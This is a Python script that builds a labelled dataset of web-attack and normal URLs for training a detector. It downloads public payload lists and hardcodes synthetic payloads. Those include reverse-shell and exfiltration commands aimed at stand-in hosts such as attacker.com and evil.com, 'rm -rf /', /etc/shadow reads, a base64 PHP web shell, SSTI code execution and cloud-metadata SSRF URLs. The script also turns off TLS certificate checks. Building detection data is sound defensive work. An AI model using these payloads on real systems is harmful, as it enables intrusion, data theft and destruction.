"""
build_dataset.py - Thu thap va gop du lieu tu nhieu nguon
Tao combined_dataset.csv voi multi-class labels:
  0 = Normal/Benign
  1 = SQL Injection
  2 = XSS
  3 = Command Injection
  4 = Path Traversal / LFI
  5 = Other Attack (SSTI, XXE, SSRF, NoSQLi, Open Redirect)
"""

import csv
import os
import random
import string
import urllib.request
import ssl
import time
import re as re_mod
from collections import Counter

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RAW_DIR = os.path.join(BASE_DIR, "raw_payloads")
OUTPUT = os.path.join(BASE_DIR, "combined_dataset.csv")

os.makedirs(RAW_DIR, exist_ok=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Base URLs
PAT = "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master"
PB  = "https://raw.githubusercontent.com/payload-box"

GITHUB_SOURCES = {
    # ── SQL Injection ──────────────────────────────────────
    "sqli": [
        f"{PAT}/SQL%20Injection/Intruder/Auth_Bypass.txt",
        f"{PAT}/SQL%20Injection/Intruder/Auth_Bypass2.txt",
        f"{PAT}/SQL%20Injection/Intruder/Generic_ErrorBased.txt",
        f"{PAT}/SQL%20Injection/Intruder/Generic_TimeBased.txt",
        f"{PAT}/SQL%20Injection/Intruder/Generic_UnionSelect.txt",
        f"{PAT}/SQL%20Injection/Intruder/Generic_Fuzz.txt",
        f"{PAT}/SQL%20Injection/Intruder/SQLi_Polyglots.txt",
        f"{PAT}/SQL%20Injection/Intruder/FUZZDB_MYSQL.txt",
        f"{PAT}/SQL%20Injection/Intruder/FUZZDB_MSSQL.txt",
        f"{PAT}/SQL%20Injection/Intruder/FUZZDB_Oracle.txt",
        f"{PAT}/SQL%20Injection/Intruder/FUZZDB_Postgres_Enumeration.txt",
        f"{PAT}/SQL%20Injection/Intruder/FUZZDB_MySQL_ReadLocalFiles.txt",
        f"{PAT}/SQL%20Injection/Intruder/payloads-sql-blind-MySQL-WHERE",
        f"{PAT}/SQL%20Injection/Intruder/payloads-sql-blind-MySQL-ORDER_BY",
        f"{PAT}/SQL%20Injection/Intruder/payloads-sql-blind-MSSQL-WHERE",
        # payload-box
        f"{PB}/sql-injection-payload-list/refs/heads/master/mysql-payloads.txt",
        f"{PB}/sql-injection-payload-list/refs/heads/master/mssql-payloads.txt",
        f"{PB}/sql-injection-payload-list/refs/heads/master/sqlite-payloads.txt",
        f"{PB}/sql-injection-payload-list/refs/heads/master/postgresql-payloads.txt",
        f"{PB}/sql-injection-payload-list/refs/heads/master/oracle-payloads.txt",
        f"{PB}/sql-injection-payload-list/refs/heads/master/burp-intruder-payloads.txt",
    ],
    # ── XSS ────────────────────────────────────────────────
    "xss": [
        f"{PAT}/XSS%20Injection/Intruders/IntrudersXSS.txt",
        f"{PAT}/XSS%20Injection/Intruders/JHADDIX_XSS.txt",
        f"{PAT}/XSS%20Injection/Intruders/XSS_Polyglots.txt",
        f"{PAT}/XSS%20Injection/Intruders/RSNAKE_XSS.txt",
        f"{PAT}/XSS%20Injection/Intruders/BRUTELOGIC-XSS-STRINGS.txt",
        f"{PAT}/XSS%20Injection/Intruders/xss_alert.txt",
        f"{PAT}/XSS%20Injection/Intruders/xss_payloads_quick.txt",
        f"{PAT}/XSS%20Injection/Intruders/XSSDetection.txt",
        f"{PAT}/XSS%20Injection/Intruders/MarioXSSVectors.txt",
        # payload-box
        f"{PB}/xss-payload-list/refs/heads/master/Payloads/All-In-One.txt",
    ],
    # ── Command Injection ──────────────────────────────────
    "cmdi": [
        f"{PAT}/Command%20Injection/Intruder/command-execution-unix.txt",
        f"{PAT}/Command%20Injection/Intruder/command_exec.txt",
        # payload-box
        f"{PB}/command-injection-payload-list/refs/heads/master/Intruder/command-injection-basic.txt",
        f"{PB}/command-injection-payload-list/refs/heads/master/Intruder/command-injection-bypass.txt",
        f"{PB}/command-injection-payload-list/refs/heads/master/Intruder/command-injection-encoded.txt",
        f"{PB}/command-injection-payload-list/refs/heads/master/Intruder/command-injection-linux.txt",
        f"{PB}/command-injection-payload-list/refs/heads/master/Intruder/command-injection-obfuscated.txt",
        f"{PB}/command-injection-payload-list/refs/heads/master/Intruder/command-injection-windows.txt",
        f"{PB}/command-injection-payload-list/refs/heads/master/Intruder/command-injection-time-based.txt",
        f"{PB}/command-injection-payload-list/refs/heads/master/Intruder/command-injection-special-chars.txt",
        f"{PB}/command-injection-payload-list/refs/heads/master/Intruder/command-injection-polyglot.txt",
        f"{PB}/command-injection-payload-list/refs/heads/master/Intruder/command-injection-data-exfiltration.txt",
        f"{PB}/command-injection-payload-list/refs/heads/master/Intruder/command-injection-out-of-band.txt",
    ],
    # ── Path Traversal / LFI ───────────────────────────────
    "lfi": [
        f"{PAT}/Directory%20Traversal/Intruder/deep_traversal.txt",
        f"{PAT}/Directory%20Traversal/Intruder/traversals-8-deep-exotic-encoding.txt",
        f"{PAT}/Directory%20Traversal/Intruder/directory_traversal.txt",
        f"{PAT}/Directory%20Traversal/Intruder/dotdotpwn.txt",
        f"{PAT}/File%20Inclusion/Intruders/JHADDIX_LFI.txt",
        f"{PAT}/File%20Inclusion/Intruders/Traversal.txt",
        f"{PAT}/File%20Inclusion/Intruders/Linux-files.txt",
        f"{PAT}/File%20Inclusion/Intruders/Windows-files.txt",
        f"{PAT}/File%20Inclusion/Intruders/List_Of_File_To_Include.txt",
        f"{PAT}/File%20Inclusion/Intruders/Web-files.txt",
    ],
    # ── Other (SSTI, XXE, SSRF, NoSQLi, Open Redirect) ────
    "other": [
        f"{PAT}/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz",
        f"{PAT}/XXE%20Injection/Intruders/XXE_Fuzzing.txt",
        f"{PAT}/XXE%20Injection/Intruders/xml-attacks.txt",
        f"{PAT}/NoSQL%20Injection/Intruder/MongoDB.txt",
        f"{PAT}/NoSQL%20Injection/Intruder/NoSQL.txt",
        f"{PAT}/Open%20Redirect/Intruder/Open-Redirect-payloads.txt",
        f"{PAT}/Open%20Redirect/Intruder/open_redirect_wordlist.txt",
        f"{PAT}/Open%20Redirect/Intruder/openredirects.txt",
    ],
}

LABEL_MAP = {"sqli": 1, "xss": 2, "cmdi": 3, "lfi": 4, "other": 5}
LABEL_NAMES = {0: "normal", 1: "sqli", 2: "xss", 3: "cmdi", 4: "lfi", 5: "other"}


def download_file(url, local_path):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, context=ctx, timeout=20)
        data = resp.read()
        with open(local_path, "wb") as f:
            f.write(data)
        return True
    except Exception as e:
        print(f"  [SKIP] {os.path.basename(local_path)}: {e}")
        return False


def read_payload_file(filepath):
    """Read payload file safely using binary mode to avoid Windows filename issues."""
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        text = data.decode("utf-8", errors="ignore")
        lines = [l.strip() for l in text.splitlines() if l.strip() and not l.startswith("#")]
        return lines
    except Exception as e:
        print(f"  [READ-ERR] {filepath}: {e}")
        return []


def download_all_payloads():
    results = {}
    for category, urls in GITHUB_SOURCES.items():
        cat_dir = os.path.join(RAW_DIR, category)
        os.makedirs(cat_dir, exist_ok=True)
        payloads = []
        for url in urls:
            fname = url.split("/")[-1]
            # Sanitize filename for Windows
            fname = "".join(c if c.isalnum() or c in ".-_" else "_" for c in fname)
            local = os.path.join(cat_dir, fname)
            if os.path.exists(local) and os.path.getsize(local) > 100:
                print(f"  [CACHED] {category}/{fname}")
            else:
                print(f"  [GET]    {category}/{fname} ...")
                if not download_file(url, local):
                    continue
                time.sleep(0.3)
            lines = read_payload_file(local)
            payloads.extend(lines)
            print(f"           -> {len(lines)} payloads")
        results[category] = list(set(payloads))
        print(f"  [{category.upper()}] Total unique: {len(results[category])}")
    return results


# ══════════════════════════════════════════════════════════════════
#  PAYLOAD → URL WRAPPING
# ══════════════════════════════════════════════════════════════════

URL_TEMPLATES = {
    "sqli": [
        "/search?q={p}", "/api/v1/users?filter={p}", "/login?username={p}&password=test",
        "/products?category={p}", "/page?id={p}", "/api/query?input={p}",
        "/user/profile?id={p}", "/orders?status={p}", "/report?year={p}",
        "/admin?action={p}", "/blog?post_id={p}",
    ],
    "xss": [
        "/search?q={p}", "/comment?text={p}", "/profile?name={p}",
        "/blog/post?title={p}", "/feedback?msg={p}", "/share?content={p}",
        "/api/data?q={p}&format=json", "/forum/reply?body={p}",
    ],
    "cmdi": [
        "/exec?cmd={p}", "/api/ping?host={p}", "/tools/lookup?domain={p}",
        "/admin/run?command={p}", "/network/test?target={p}",
        "/system/exec?input={p}", "/debug?eval={p}",
    ],
    "lfi": [
        "/view?file={p}", "/download?path={p}", "/include?page={p}",
        "/static?resource={p}", "/read?doc={p}", "/template?name={p}",
        "/load?module={p}", "/image?src={p}",
    ],
    "other": [
        "/search?q={p}", "/api/data?input={p}", "/render?template={p}",
        "/redirect?url={p}", "/proxy?target={p}", "/api/xml?data={p}",
        "/callback?next={p}", "/auth?return_to={p}",
    ],
}


def payload_to_url(payload, category):
    p = payload.strip()
    if p.startswith("/") or p.startswith("http"):
        return p
    templates = URL_TEMPLATES.get(category, URL_TEMPLATES["other"])
    tmpl = random.choice(templates)
    return tmpl.replace("{p}", p)


# ══════════════════════════════════════════════════════════════════
#  CSIC 2010
# ══════════════════════════════════════════════════════════════════

def load_csic_data():
    csic_path = os.path.join(BASE_DIR, "csic_database.csv", "csic_database.csv")
    if not os.path.exists(csic_path):
        print("[WARN] CSIC dataset not found, skipping.")
        return [], []

    normals = []
    attacks = []
    with open(csic_path, "r", encoding="utf-8", errors="ignore") as f:
        reader = csv.DictReader(f)
        for row in reader:
            url = row.get("URL", "").strip()
            classification = row.get("classification", "").strip()
            content = row.get("content", "").strip()
            if not url:
                continue
            url = re_mod.sub(r'^https?://[^/]+', '', url)
            url = re_mod.sub(r'\s+HTTP/\d\.\d\s*$', '', url)
            if not url:
                url = "/"

            # Gộp content (POST body) vào request nếu có
            if content and content != "None":
                sep = "&" if "?" in url else "?"
                url = f"{url}{sep}{content}"

            if classification == "0":
                normals.append(url)
            else:
                attacks.append(url)

    print(f"  [CSIC] Normal: {len(normals)}, Attack: {len(attacks)}")
    return normals, attacks


# ══════════════════════════════════════════════════════════════════
#  NORMAL URL GENERATION
# ══════════════════════════════════════════════════════════════════

NORMAL_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact",
    "/products", "/services", "/blog", "/faq", "/login",
    "/register", "/dashboard", "/settings", "/profile",
    "/api/v1/status", "/api/v1/health", "/api/v2/users",
    "/docs", "/help", "/terms", "/privacy", "/sitemap.xml",
    "/robots.txt", "/favicon.ico", "/static/css/main.css",
    "/static/js/app.js", "/images/logo.png",
    "/en/home", "/vi/trang-chu", "/fr/accueil",
    "/shop", "/cart", "/checkout", "/orders", "/wishlist",
    "/news", "/events", "/gallery", "/team", "/careers",
    "/api/products", "/api/categories", "/api/orders",
    "/.well-known/security.txt", "/manifest.json",
    "/health", "/ping", "/version", "/metrics",
]

NORMAL_TEMPLATES = [
    "/products?page={n}&limit=20&sort=price",
    "/search?q={word}&lang=en",
    "/api/v1/users/{n}",
    "/api/v1/products?category={word}&page={n}",
    "/blog/post/{n}",
    "/blog/{year}/{month}/{slug}",
    "/shop/category/{word}?sort=newest&page={n}",
    "/user/{n}/orders?status=completed",
    "/api/data?from=2024-01-01&to=2024-12-31",
    "/images/product_{n}.jpg",
    "/download/report_{n}.pdf",
    "/en/products/{word}?ref=homepage",
    "/api/v2/search?q={word}&offset={n}&limit=25",
    "/webhook/callback?event=payment&id={uuid}",
    "/auth/callback?code={code}&state={state}",
    "/feed.xml?format=rss&count={n}",
    "/api/v1/metrics?period=daily&metric={word}",
    "/files/{uuid}/preview",
    "/shop/{word}/reviews?rating={rating}&page={n}",
    "/api/v3/items?brand={word}&minPrice={n}&maxPrice={n2}",
    "/category/{word}/products?color={color}&size={size}",
    "/checkout/step/{step}?cartId={uuid}",
    "/notifications?read=false&limit={n}",
    "/settings/profile?tab=security",
    "/api/v1/analytics?start=2025-01-01&end=2025-12-31&granularity=daily",
    "/docs/api/{word}/getting-started",
    "/support/ticket/{n}",
    "/admin/users?page={n}&role=editor",
    "/api/webhooks/{uuid}/deliveries",
    "/i18n/messages?locale=vi-VN",
    # Benign Authentication & Forms
    "/login?username={word}&password=DemoPass{n}",
    "/auth/login?user={word}&password=Pass{n}Word!",
    "/api/login?username={word}&password={code}",
    "/signin?email={word}@example.com&password=UserPassword{n}",
    "/register?username={word}&email={word}@gmail.com&password=SecretPass{n}",
    "/contact?name={word}&email={word}@mail.com&message=Hello+support+team",
    "/feedback?user={word}&rating={rating}&comments=Great+service+thank+you",
]

WORDS = [
    "laptop", "phone", "tablet", "camera", "headphone", "keyboard", "mouse",
    "monitor", "printer", "speaker", "software", "hardware", "network",
    "security", "database", "server", "cloud", "analytics", "report",
    "dashboard", "user", "customer", "product", "order", "invoice",
    "payment", "shipping", "delivery", "tracking", "notification", "email",
    "message", "chat", "forum", "article", "tutorial", "documentation",
    "electronics", "clothing", "food", "books", "music", "movies", "games",
    "sport", "travel", "health", "education", "finance", "marketing",
    "smartphone", "accessories", "furniture", "kitchen", "garden", "toys",
    "beauty", "automotive", "office", "industrial", "pet-supplies",
]

SLUGS = [
    "getting-started-with-python", "top-10-security-tips",
    "how-to-build-a-website", "machine-learning-basics",
    "best-practices-for-api-design", "introduction-to-docker",
    "understanding-web-security", "cloud-computing-guide",
    "data-science-for-beginners", "mobile-app-development",
    "react-vs-vue-comparison", "devops-pipeline-tutorial",
    "microservices-architecture", "kubernetes-deployment-guide",
]

COLORS = ["red", "blue", "green", "black", "white", "gray", "pink", "navy"]
SIZES = ["S", "M", "L", "XL", "XXL", "38", "39", "40", "41", "42"]


def generate_normal_urls(count=40000):
    urls = set(NORMAL_PATHS)

    # Common web assets (html, css, js, images, fonts)
    static_exts = ['.html', '.htm', '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.gif', '.ico', '.woff', '.woff2', '.json']
    pages = ['index', 'home', 'about', 'contact', 'login', 'register', 'dashboard', 'profile', 'settings', 'faq', 'terms', 'privacy', 'help', 'services', 'products', 'blog', 'news', 'cart', 'checkout', 'search', 'overview', 'main']
    folders = ['/', '/static/', '/assets/', '/public/', '/views/', '/pages/', '/content/', '/dist/', '/build/', '/media/', '/images/', '/css/', '/js/']

    for p in pages:
        for ext in static_exts:
            for f in folders:
                urls.add(f"{f}{p}{ext}")
                urls.add(f"{f}v{random.randint(1,5)}/{p}{ext}")

    # Standard clean parameterized URLs
    for _ in range(count):
        tmpl = random.choice(NORMAL_TEMPLATES)
        url = tmpl.replace("{n}", str(random.randint(1, 9999)))
        url = url.replace("{n2}", str(random.randint(100, 99999)))
        url = url.replace("{word}", random.choice(WORDS))
        url = url.replace("{year}", str(random.randint(2020, 2026)))
        url = url.replace("{month}", f"{random.randint(1,12):02d}")
        url = url.replace("{slug}", random.choice(SLUGS))
        url = url.replace("{uuid}", "".join(random.choices("0123456789abcdef", k=32)))
        url = url.replace("{code}", "".join(random.choices(string.ascii_letters + string.digits, k=20)))
        url = url.replace("{state}", "".join(random.choices(string.ascii_letters, k=12)))
        url = url.replace("{rating}", str(random.randint(1, 5)))
        url = url.replace("{color}", random.choice(COLORS))
        url = url.replace("{size}", random.choice(SIZES))
        url = url.replace("{step}", str(random.randint(1, 4)))
        urls.add(url)
    result = list(urls)
    print(f"  [NORMAL-GEN] Generated {len(result)} unique normal URLs")
    return result


# ══════════════════════════════════════════════════════════════════
#  SYNTHETIC FALLBACK
# ══════════════════════════════════════════════════════════════════

def generate_synthetic_payloads():
    synth = {}

    # SQLi
    sqli_bases = [
        "' OR 1=1--", "' OR ''='", "1' ORDER BY 1--+", "' UNION SELECT NULL--",
        "' UNION SELECT username,password FROM users--", "admin'--",
        "1; DROP TABLE users--", "' AND 1=CONVERT(int,@@version)--",
        "') OR ('1'='1", "' WAITFOR DELAY '0:0:5'--",
        "'; EXEC xp_cmdshell('dir')--", "' OR SLEEP(5)#",
        "' HAVING 1=1--", "' GROUP BY userid HAVING 1=1--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "1 AND 1=1", "1 OR 1=1", "1' AND '1'='1",
    ]
    synth["sqli"] = []
    tables = ["users", "accounts", "admin", "customers", "orders", "products", "sessions", "employees", "payments"]
    cols = ["password", "email", "username", "credit_card", "token", "ssn", "phone", "address", "secret"]
    for base in sqli_bases:
        synth["sqli"].append(base)
        for _ in range(20):
            s = base
            if "users" in s:
                s = s.replace("users", random.choice(tables))
            if "password" in s:
                s = s.replace("password", random.choice(cols))
            synth["sqli"].append(s)

    # XSS
    xss_bases = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>", "javascript:alert(document.cookie)",
        "<iframe src='javascript:alert(1)'>", "<body onload=alert(1)>",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "'-alert(1)-'", "<img src=x onerror=prompt(1)>",
        "<svg><script>alert(1)</script></svg>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>", "<details open ontoggle=alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "{{constructor.constructor('alert(1)')()}}", "${alert(1)}",
        "<img/src/onerror=alert(1)>", "%3Cscript%3Ealert(1)%3C/script%3E",
        "<ScRiPt>alert(1)</ScRiPt>", "<scr<script>ipt>alert(1)</scr</script>ipt>",
    ]
    synth["xss"] = []
    for base in xss_bases:
        synth["xss"].append(base)
        for _ in range(15):
            synth["xss"].append(base.replace("alert(1)", f"alert({random.randint(1,999)})"))
            synth["xss"].append(base.replace("alert(1)", f"prompt({random.randint(1,999)})"))

    # CMDi
    cmdi_bases = [
        "; ls -la", "| cat /etc/passwd", "`whoami`", "$(id)",
        "127.0.0.1; cat /etc/shadow", "& ping -c 3 attacker.com",
        "| nc attacker.com 4444 -e /bin/sh", "; wget http://evil.com/shell.sh",
        "127.0.0.1 && rm -rf /", "`sleep 10`", "$(sleep${IFS}10)",
        ";echo${IFS}vulnerable", "%0a id", "dir C:\\",
        "& type C:\\Windows\\win.ini", ";curl attacker.com/$(whoami)",
        "| bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        "$(cat</etc/passwd)", ";cat${IFS}/etc/passwd",
        "|{cat,/etc/passwd}", "$(printf '\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
    ]
    synth["cmdi"] = []
    for base in cmdi_bases:
        synth["cmdi"].append(base)
        for _ in range(12):
            ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            s = base.replace("attacker.com", ip).replace("evil.com", f"evil{random.randint(1,99)}.com")
            s = s.replace("10.0.0.1", ip)
            synth["cmdi"].append(s)

    # LFI
    lfi_targets = ["etc/passwd", "etc/shadow", "etc/hosts", "proc/self/environ",
                   "var/log/apache2/access.log", "var/log/auth.log",
                   "windows/win.ini", "windows/system32/config/sam",
                   "boot.ini", "windows/system32/drivers/etc/hosts"]
    synth["lfi"] = []
    for target in lfi_targets:
        for depth in range(1, 10):
            synth["lfi"].append("../" * depth + target)
            synth["lfi"].append("..%2f" * depth + target.replace("/", "%2f"))
            synth["lfi"].append("..%252f" * depth + target.replace("/", "%252f"))
            synth["lfi"].append("..%c0%af" * depth + target)
            synth["lfi"].append("....///" * depth + target)
    synth["lfi"].extend([
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        "expect://id", "file:///etc/passwd",
    ])

    # Other
    synth["other"] = [
        # SSTI
        "{{7*7}}", "{{config}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__}}",
        "{%import os%}{{os.popen('id').read()}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        # XXE
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "test">]><foo>&xxe;</foo>',
        '<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">',
        # SSRF
        "http://127.0.0.1:22", "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/admin", "http://0x7f000001/", "http://localhost:8080/admin",
        "gopher://127.0.0.1:25/", "dict://127.0.0.1:6379/info",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/latest/api/token",
        # NoSQLi
        '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
        "admin'||'1'=='1", '{"username":{"$gt":""},"password":{"$gt":""}}',
        '[$ne]=1', '{"$where":"sleep(5000)"}',
    ]
    # Multiply other for volume
    synth["other"] = synth["other"] * 3

    return synth


# ══════════════════════════════════════════════════════════════════
#  MAIN BUILD
# ══════════════════════════════════════════════════════════════════

def main():
    print("=" * 60)
    print("  DATASET BUILDER v2 - Multi-Source Web Attack Dataset")
    print("=" * 60)

    all_rows = []  # (url, label_int, attack_type_str)

    # ── Step 1: Download ──
    print("\n[1/5] Downloading payloads from GitHub...")
    downloaded = download_all_payloads()

    # ── Step 2: Synthetic fallback ──
    print("\n[2/5] Generating synthetic payloads...")
    synthetic = generate_synthetic_payloads()

    # Merge and wrap into URLs
    for category in LABEL_MAP:
        dl = downloaded.get(category, [])
        sy = synthetic.get(category, [])
        combined = list(set(dl + sy))
        label = LABEL_MAP[category]
        label_name = LABEL_NAMES[label]

        count = 0
        for payload in combined:
            url = payload_to_url(payload, category)
            if len(url) > 2000:
                continue
            all_rows.append((url, label, label_name))
            count += 1
        print(f"  [{category.upper()}] {len(combined)} unique payloads -> {count} URLs")

    # ── Step 3: CSIC ──
    print("\n[3/5] Loading CSIC 2010 dataset...")
    csic_normal, csic_attack = load_csic_data()
    for url in csic_normal:
        all_rows.append((url, 0, "normal"))
    for url in csic_attack:
        all_rows.append((url, 1, "sqli"))  # CSIC attacks are mostly SQLi-like
    print(f"  Added {len(csic_normal)} normal + {len(csic_attack)} attack from CSIC")

    # ── Step 4: Generate normal URLs ──
    print("\n[4/5] Generating diverse normal URLs...")
    normal_urls = generate_normal_urls(count=40000)
    for url in normal_urls:
        all_rows.append((url, 0, "normal"))

    # ── Step 5: Balance check & write ──
    print("\n[5/5] Balancing and writing output...")

    # Count per class before balancing
    counts_before = Counter(r[1] for r in all_rows)
    print("  Before balance:")
    for lbl in sorted(counts_before):
        print(f"    {lbl} ({LABEL_NAMES[lbl]:>8s}): {counts_before[lbl]:>8,}")

    # Oversample minority classes to at least 2000 each (except class 0 and 1 which are large)
    min_target = 2000
    rows_by_label = {}
    for row in all_rows:
        rows_by_label.setdefault(row[1], []).append(row)

    balanced_rows = []
    for lbl, rows in rows_by_label.items():
        balanced_rows.extend(rows)
        if len(rows) < min_target and lbl not in (0, 1):
            # Oversample
            extra = min_target - len(rows)
            oversampled = [random.choice(rows) for _ in range(extra)]
            balanced_rows.extend(oversampled)
            print(f"  Oversampled {LABEL_NAMES[lbl]}: {len(rows)} -> {len(rows)+extra}")

    random.shuffle(balanced_rows)

    with open(OUTPUT, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["url", "label", "attack_type"])
        for url, label, atype in balanced_rows:
            writer.writerow([url, label, atype])

    # Final stats
    final_counts = Counter(r[1] for r in balanced_rows)
    final_types = Counter(r[2] for r in balanced_rows)

    print("\n" + "=" * 60)
    print(f"  OUTPUT: {OUTPUT}")
    print(f"  TOTAL ROWS: {len(balanced_rows):,}")
    print("-" * 60)
    print("  By label:")
    for lbl in sorted(final_counts):
        print(f"    {lbl} ({LABEL_NAMES[lbl]:>8s}): {final_counts[lbl]:>8,}")
    print("-" * 60)
    print("  By attack_type:")
    for t, c in final_types.most_common():
        print(f"    {t:>15s}: {c:>8,}")
    print("=" * 60)
    print("  Done!")


if __name__ == "__main__":
    main()
